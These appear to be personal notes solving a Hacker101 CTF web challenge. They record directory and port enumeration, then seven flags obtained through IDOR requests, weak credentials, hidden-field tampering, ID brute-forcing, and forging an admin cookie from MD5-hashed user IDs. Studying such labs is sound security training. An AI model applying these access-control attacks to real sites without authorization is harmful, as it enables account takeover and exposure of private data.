target: https://6e17828e65720c02ea0fd05b94db0583.ctf.hacker101.com/

#### ENUMERATION
####Directory
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://6e17828e65720c02ea0fd05b94db0583.ctf.hacker101.com/FUZZ -p 1
###Result
.hta		Forbidden
.htaccess	Forbidden
.htpasswd	Forbidden
index.php	Home page (/)
pages		Index of /pages
	account.php
	create.php
	delete.php
	edit.php
	home.php	-> some text
	profile.php	
	sign_in.php	-> sign in form (username:password)
	sign_out.php	-> redirect to /index.php, but instead /pages/index.php
	sign_up.php	-> sign up form 
		<form method="post" action="index.php?page=sign_up.php">
		<script>
      function validate() {
        var username = document.getElementById('username');
        var submit = document.getElementById('submit');

        if(/^[a-z]+$/.test(username.value)) {
          submit.disabled = false;
        } else {
          submit.disabled = true;
        }
      }
    </script>
    <input type="text" id="username" placeholder="Username" onkeyup="validate()" name="username" />
	view.php
	###Result
	The empty pages have .php file founded have size but empty when opened.	
php.ini		not important text
server-status	Forbidden


####Port
nmap -A -F -T1 https://6e17828e65720c02ea0fd05b94db0583.ctf.hacker101.com/ -v
###Result
None, because target already on a subdomain

####Surfing the Web
Wappalyzer	-> PHP
Source code	-> /, /index.php?page=sign_up.php, /index.php?page=sign_in.php -> None
Test account	-> test:test
	cookie	-> id:a87ff679a2f3e71d9181a67b7542122c
	--after logged in, create.php, edit.php, delete.php accessable
	create.php -> title&post form (required), private checklist, <input type="hidden" name="user_id" value="4" />, 
	account.php	-> change credentials
	index.php	-> 2 early posted created by user & admin
	
	using {POST /index.php?page=create.php} with {title=testTitle&body=testPost&user_id=0} using user_id, IDOR can be done and found 1=admin 2=user
	using {GET /index.php?page=profile.php&id=b} using id, IDOR can be done and found b=admin c=user




#FLAG1
GET /index.php?page=view.php&id=2 -> IDOR to see other accound post
#FLAG2
POST /index.php?page=edit.php&id=2 -> IDOR to make the private post into public
#FLAG3
sign in using user:password -> Weak credentials, able to change account username&password afterward
#FLAG4  v
<input type="hidden" name="user_id" value="2" /> -> hidden/commented input that are accessable using inspect element
#FLAG5
GET /index.php?page=view.php&id=945 -> bruteforcing id using burpsuite
#FLAG6
GET /index.php?page=delete.php&id=c9f0f895fb98ab9159f51fd0297e236d -> another weak
#FLAG7
Logged in into admin account using cookie -> reversing the cookie from user account (md5) which translate to 2, then reversing 1 to get cookie for admin account

c81e728d9d4c2f636f067f89cc14862c = 2
c4ca4238a0b923820dcc509a6f75849b = 1